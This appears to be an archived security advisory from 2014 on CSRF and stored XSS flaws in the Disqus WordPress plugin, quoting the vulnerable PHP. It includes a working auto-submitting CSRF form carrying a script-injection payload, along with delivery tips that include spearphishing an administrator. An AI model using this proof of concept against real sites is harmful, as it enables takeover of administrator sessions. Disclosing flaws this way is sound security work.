@@ -1,0 +1,83 @@
+id: 22512
+date: 08/13/2014
+title: WordPress Disqus 2.7.5 CSRF / Cross Site Scripting Vulnerabilities
+author: Nik Cubrilovic
+cves: 
+
+Vendor: Disqus for WordPress
+
+Affected versions: up to v2.7.5
+
+Patched: v2.7.6 release
+
+Exploit: Manage.php CSRF+XSS admin exploit
+
+Disqus is an extremely popular third-party commenting system used on blogs and media sites. The disqus plugin for WordPress has been installed over a million times and is the 15th most popular overall WordPress plugin.
+
+I recently performed a penetration test where the website was running the latest version with a small number of plugins, one of which was Disqus – which lead me to dive into the code. Grepping the codebase for POST and GET parameters pretty quickly yielded code blocks where parameters were being passed and output without any filtering.
+
+Issue 1: CSRF in Manage.php
+
+In the file manage.php which handles the plugin settings there is this block of code (line 60 onwards):
+
+// Handle advanced options. 
+
+if ( isset($_POST['disqus_forum_url']) && isset($_POST['disqus_replace']) ) { update_option('disqus_partner_key', trim(stripslashes($_POST['disqus_partner_key']))); update_option('disqus_replace', $_POST['disqus_replace']); update_option('disqus_cc_fix', isset($_POST['disqus_cc_fix'])); update_option('disqus_manual_sync', isset($_POST['disqus_manual_sync'])); update_option('disqus_disable_ssr', isset($_POST['disqus_disable_ssr'])); update_option('disqus_public_key', $_POST['disqus_public_key']); update_option('disqus_secret_key', $_POST['disqus_secret_key']);
+
+The parameters disqus_replace, disqus_public_key and disqus_secret_key are being passed to WordPress’s update_option function directly with no filtering. The documentation for update_option says that it will take any value passed to it and store it in the database. It is up to the plugin author to filter and validate variables here, since there are cases where you want to store HTML or other types of raw data.
+
+Further down in manage.php we can see that the options are read out of the database again using get_option (line 245):
+
+<?php 
+
+$dsq_replace = get_option('disqus_replace'); $dsq_forum_url = strtolower(get_option('disqus_forum_url')); $dsq_api_key = get_option('disqus_api_key'); $dsq_user_api_key = get_option('disqus_user_api_key'); $dsq_partner_key = get_option('disqus_partner_key'); $dsq_cc_fix = get_option('disqus_cc_fix'); $dsq_manual_sync = get_option('disqus_manual_sync'); $dsq_disable_ssr = get_option('disqus_disable_ssr'); $dsq_public_key = get_option('disqus_public_key'); $dsq_secret_key = get_option('disqus_secret_key'); $dsq_sso_button = get_option('disqus_sso_button'); $dsq_sso_icon = get_option('disqus_sso_icon');
+
+These variables are then printed back out on the page in the form, where they are filtered properly:
+
+<option value="all" <?php if('all'==$dsq_replace){echo 'selected';}?>
+<?php 
+echo dsq_i('On all existing and future blog posts.'); ?></option> <option value="closed" <?php if('closed'==$dsq_replace){echo 'selected';}?>><?php echo dsq_i('Only on blog posts with closed comments.'); ?></option>
+<input type="text" name="disqus_public_key" value="<?php echo esc_attr($dsq_pubdsq_public_keylic_key); ?>" tabindex="2">
+<input type="text" name="disqus_secret_key" value="<?php echo esc_attr($dsq_secret_key); ?>" tabindex="2">
+
+They are only output there after being passed through the WordPress esc_attr function which will string replace HTML characters and escape them.
+
+But at the very bottom of the page there is a ‘debug’ feature that dumps all the settings into a textarea. This is used to troubleshoot the plugin, where Disqus support can ask a user to simply copy/paste what is in the textarea to find problems.
+
+In the debug area all of these variables are dumped out into the textarea with no filtering. The relevant code (line 537):
+<?php 
+echo get_option('siteurl'); ?> PHP Version: <?php echo phpversion(); ?> Version: <?php echo $wp_version; ?> Active Theme: <?php $theme = get_theme(get_current_theme()); echo $theme['Name'].' '.$theme['Version']; ?> URLOpen Method: <?php echo dsq_url_method(); ?> Plugin Version: <?php echo DISQUS_VERSION; ?> Settings: dsq_is_installed: <?php echo dsq_is_installed(); ?> <?php foreach (dsq_options() as $opt) { echo $opt.': '.get_option($opt)."\n"; } ?>
+
+We can see that the loop will go through each Disqus option and then dump the value unfiltered. To exploit this, we go back and pick any variable and pass in an XSS exploit.
+
+To exploit this, we need our victim to hit a page we setup where the exploit will be injected via CSRF. Here is a pretty standard example exploit:
+<body onload="javascript:document.forms[0].submit()"> <form action="http://wordpress.dev/wp-admin/edit-comments.php?page=disqus" method="post" class="dashboard-widget-control-form"> <h1>disqus csrf</h1> <input name="disqus_forum_url" type="hidden" value="wordpress342222222" /> <input name="disqus_replace" type="hidden" value="all" /> <input name="disqus_cc_fix" type="hidden" value="1" /> <input name="disqus_partner_key" type="hidden" value="1" /> <input name="disqus_secret_key" type="hidden" value="1" /> <input type="submit" value="save" /> <input name="disqus_public_key" type="hidden" value='</textarea><script>alert(1);</script><textarea>' /> </form>
+
+We set this HTML page up on our own server, or better yet get it somehow on the same domain as the WordPress install (which means we can IFRAME it invisibly since WordPress sets X-Frame-Options).
+
+That exploit payload, </textarea><script>alert(1);</script><textarea> will close up the textarea and then inject a script that will popup an alert as a test.
+
+This is what it looks like:
+
+The last little touch on our exploit is that we trigger the form submit on pageload. I successfully utilized this exploit against a live environment as part of a pen test via a spearphish email to an administrator (my exploit was a little more sophisticated and the payload useful).
+Issue 2: No nonce check on setting reset and delete
+
+This one is less serious, but on the same advanced settings page for the plugin the submitted nonce isn’t checked meaning we can use CSRF to trigger the ‘reset’ function or to delete any of the disqus plugin options.
+// Handle resetting.
+if ( isset($_POST['reset']) ) {
+foreach (dsq_options() as $opt) { 
+delete_option($opt); 
+} 
+unset($_POST);
+dsq_reset_database(); 
+?>
+
+Exploit here is simple again, take the last exploit and remove all the fields and add one for ‘reset’. Deliver to a victim and we can trigger the reset or a delete action.
+
+The form includes a nonce, but it isn’t being checked on submit. The wp_verify_nonce function (documentation) should be called on submit.
+Issue 3: Unfiltered parameter in upgrade script
+
+The step parameter is stored unfiltered and then echo’d out, resulting in an XSS. Code path can be hit when Disqus install is out of date.
+$step = (isset($_GET['step']) ? $_GET['step'] : null); ?> <div class="wrap"> <h2><?php echo dsq_i('Upgrade Disqus Comments'); ?></h2> <form method="POST" action="?page=disqus&step=<?php echo $step; ?>">
+
+#  0day.today [2023-03-22]  #
